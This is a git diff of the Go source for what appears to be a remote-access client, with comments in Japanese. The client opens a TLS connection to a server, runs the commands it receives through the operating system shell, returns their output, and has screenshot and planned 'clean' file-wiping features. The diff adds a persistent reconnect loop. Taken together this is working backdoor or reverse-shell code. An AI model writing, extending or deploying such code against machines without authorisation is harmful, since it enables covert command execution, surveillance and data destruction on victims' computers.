@@ -99,18 +99,19 @@ func getscreenshot() ([]string, error) {
 	return filenames, nil
 }
 
-func runShell(conn net.Conn) {
+func runShell(conn net.Conn) error {
 	defer conn.Close()
+
 	for {
 		cmdBuff := make([]byte, 1024)
 		n, err := conn.Read(cmdBuff)
 		if err != nil {
 			if errors.Is(err, io.EOF) {
 				log.Println("disconnect")
-				return
+				return err
 			}
 			log.Println(err)
-			return
+			return err
 		}
 
 		commands := strings.Split(string(cmdBuff[:n]), " ")
@@ -323,6 +324,9 @@ func runShell(conn net.Conn) {
 			//tips/main11.goを参考
 			fmt.Println("CLEAN")
 
+			//clean flagをつけて、正常終了
+			//その後、コマンドでファイルを全消去する
+
 		default:
 			var cmd *exec.Cmd
 			//mac linux or windows
@@ -353,6 +357,7 @@ func runShell(conn net.Conn) {
 			err = json.NewEncoder(conn).Encode(output)
 			if err != nil {
 				log.Println(err)
+				return err
 			}
 
 			/*
@@ -370,6 +375,9 @@ func runShell(conn net.Conn) {
 }
 
 func main() {
+	config.InitConfig()
+	fmt.Println(config.Config)
+
 	certFile, keyFile, err := utils.GenClientCerts()
 	if err != nil {
 		log.Fatalln(err)
@@ -385,25 +393,45 @@ func main() {
 	port := flag.String("port", "8000", "port")
 	flag.Parse()
 
-	//fmt.Println(*server, *port)
-	conn, err := tls.Dial("tcp", net.JoinHostPort(*server, *port), tlsConfig)
-	if err != nil {
-		log.Fatalf("Client dial error: %s", err)
+	var conn net.Conn = nil
+
+	for {
+		var err error
+		//time.Sleep(1 * time.Second)
+
+		if conn == nil {
+			//fmt.Println(*server, *port)
+			conn, err = tls.Dial("tcp", net.JoinHostPort(*server, *port), tlsConfig)
+			if err != nil {
+				//log.Fatalf("Client dial error: %s", err)
+				log.Println(err)
+				conn = nil
+				continue
+
+			}
+			defer fmt.Println("Cleanup")
+			defer conn.Close()
+
+			//クライアント名を作成
+			//hostName, _ := os.Hostname() //develop
+			hostName := "" //debug
+			id := genNumStr(4)
+			clientName := hostName + id
+			//送信
+			_, err = conn.Write([]byte(clientName))
+			if err != nil {
+				fmt.Println("Retry")
+				conn = nil
+				continue
+			}
+
+			//shell
+			err = runShell(conn)
+			if err != nil {
+				fmt.Println("Retry")
+				conn = nil
+				continue
+			}
+		}
 	}
-	defer fmt.Println("Cleanup")
-	defer conn.Close()
-
-	config.InitConfig()
-	fmt.Println(config.Config)
-
-	//クライアント名を作成
-	//hostName, _ := os.Hostname() //develop
-	hostName := "" //debug
-	id := genNumStr(4)
-	clientName := hostName + id
-	//送信
-	conn.Write([]byte(clientName))
-
-	//shell
-	runShell(conn)
 }
